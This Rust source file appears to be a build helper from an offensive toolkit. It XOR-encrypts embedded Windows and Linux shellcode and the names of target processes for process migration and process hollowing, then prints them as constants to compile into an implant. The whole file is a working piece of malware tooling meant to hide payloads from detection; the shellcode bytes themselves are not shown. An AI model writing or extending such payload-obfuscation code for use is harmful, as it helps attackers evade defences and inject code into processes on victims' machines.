fn main() {
    let key = rco_config::XOR_KEY;

    let win_shellcode = rco_config::WINDOWS_SHELLCODE;
    let win_output = rco_utils::xor_encrypt_decrypt(key, win_shellcode).unwrap();
    let mut win_print = "".to_owned();
    for byte in win_output.iter() {
        let formatted = format!("{byte:#04x}, ");
        win_print.push_str(&formatted);
    }
    win_print.pop();
    win_print.pop();
    println!("pub const ENCRYPTED_WINDOWS_SHELLCODE: &[u8] = &[{win_print}];");

    println!();

    let lin_shellcode = rco_config::LINUX_SHELLCODE;
    let lin_output = rco_utils::xor_encrypt_decrypt(key, lin_shellcode).unwrap();
    let mut lin_print = "".to_owned();
    for byte in lin_output.iter() {
        let formatted = format!("{byte:#04x}, ");
        lin_print.push_str(&formatted);
    }
    lin_print.pop();
    lin_print.pop();
    println!("pub const ENCRYPTED_LINUX_SHELLCODE: &[u8] = &[{lin_print}];");

    println!();

    let win_target = rco_config::WINDOWS_MIGRATION_TARGET;
    let win_output = rco_utils::xor_encrypt_decrypt(key, win_target.as_bytes()).unwrap();
    let mut win_print = "".to_owned();
    for byte in win_output.iter() {
        let formatted = format!("{byte:#04x}, ");
        win_print.push_str(&formatted);
    }
    win_print.pop();
    win_print.pop();
    println!("pub const ENCRYPTED_WINDOWS_MIGRATION_TARGET: &[u8] = &[{win_print}];");

    println!();

    let lin_target = rco_config::LINUX_MIGRATION_TARGET;
    let lin_output = rco_utils::xor_encrypt_decrypt(key, lin_target.as_bytes()).unwrap();
    let mut lin_print = "".to_owned();
    for byte in lin_output.iter() {
        let formatted = format!("{byte:#04x}, ");
        lin_print.push_str(&formatted);
    }
    lin_print.pop();
    lin_print.pop();
    println!("pub const ENCRYPTED_LINUX_MIGRATION_TARGET: &[u8] = &[{lin_print}];");

    println!();

    let win_target = rco_config::WINDOWS_HOLLOWING_TARGET;
    let win_output = rco_utils::xor_encrypt_decrypt(key, win_target.as_bytes()).unwrap();
    let mut win_print = "".to_owned();
    for byte in win_output.iter() {
        let formatted = format!("{byte:#04x}, ");
        win_print.push_str(&formatted);
    }
    win_print.pop();
    win_print.pop();
    println!("pub const ENCRYPTED_WINDOWS_HOLLOWING_TARGET: &[u8] = &[{win_print}];");

    println!();

    let lin_target = rco_config::LINUX_HOLLOWING_TARGET;
    let lin_output = rco_utils::xor_encrypt_decrypt(key, lin_target.as_bytes()).unwrap();
    let mut lin_print = "".to_owned();
    for byte in lin_output.iter() {
        let formatted = format!("{byte:#04x}, ");
        lin_print.push_str(&formatted);
    }
    lin_print.pop();
    lin_print.pop();
    println!("pub const ENCRYPTED_LINUX_HOLLOWING_TARGET: &[u8] = &[{lin_print}];");
     
}
